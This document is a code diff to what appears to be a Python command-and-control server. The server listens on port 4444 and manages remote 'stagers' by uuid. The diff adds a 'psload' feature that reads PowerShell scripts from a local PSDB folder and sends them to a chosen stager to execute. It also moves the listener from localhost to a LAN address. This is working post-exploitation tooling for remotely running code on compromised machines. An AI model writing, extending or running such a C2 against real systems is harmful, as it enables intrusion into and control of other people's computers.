@@ -3,7 +3,9 @@ import struct
 import threading
 import queue
 import uuid 
+import os
 
+#from os.path import isfile, join
 
 import readline
 readline.parse_and_bind("tab: complete")
@@ -50,12 +52,13 @@ class myconstant():
         #self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
         self.CMD_STAGER_GET_INTO = "into"
         self.CMD_STAGER_GET_HISTORY = "history"
+        self.CMD_STAGER_LOAD_PS = "psload"
         #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
-        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,self.CMD_STAGER_GET_HISTORY,self.CMD_HELP]
+        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS]
 
 
 
-class myconstant_networking():
+class myconstant_networking(): #applicaiton layer tag
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
 
@@ -69,6 +72,19 @@ class mybuildin_cmd():
         self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"
 
 
+class ps_loader():
+    def __init__(self):
+        self.DBPATH = "PSDB\\"
+        self.psfiles = [f for f in os.listdir(self.DBPATH) if os.path.isfile(os.path.join(self.DBPATH, f))]
+
+    def load_ps(self,filename):
+        if filename not in self.psfiles:
+            print("No available ...")
+            return
+
+        with open(self.DBPATH + filename,mode='r') as f:
+            all_of_it = f.read()
+            return all_of_it
 
 
 # socket is assume connected
@@ -126,7 +142,7 @@ class myserver():
         self.__mylistener_socket_list = dict()
         self.__mylistener_uuid_list = list()
 
-        self.__hostname = "127.0.0.1"
+        self.__hostname = "192.168.182.131"
         self.__port = 4444
 
 
@@ -140,6 +156,7 @@ class myserver():
             myhistory = self.__mymsg_list[myuuid]
             # make a handler class
             t_mysockethandler = mysocket_handler(mysocket)
+            
 
             try:
                 cmd_struct_to_send = item_que.get(block=True, timeout=5)
@@ -149,7 +166,12 @@ class myserver():
             
             try:
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-                myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
+                if (cmd_struct_to_send[0] == "psload"):
+                    cmd_struct_to_send[0] = "ps"
+                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
+                else:
+                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
+                
                 encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_tag)
                 myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
@@ -444,6 +466,24 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
                     continue
                 
+                if command_id == self.__t_myconstant.CMD_STAGER_LOAD_PS:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    #set auto compete for filename
+                    setautocomplete(t_psloader.psfiles)
+                    user_input_psfile = input("Please enter psfile to load: ")
+                    t_result = t_psloader.load_ps(user_input_psfile)
+                    #call psrun with tag psload
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+
 
 
 if __name__ == "__main__":
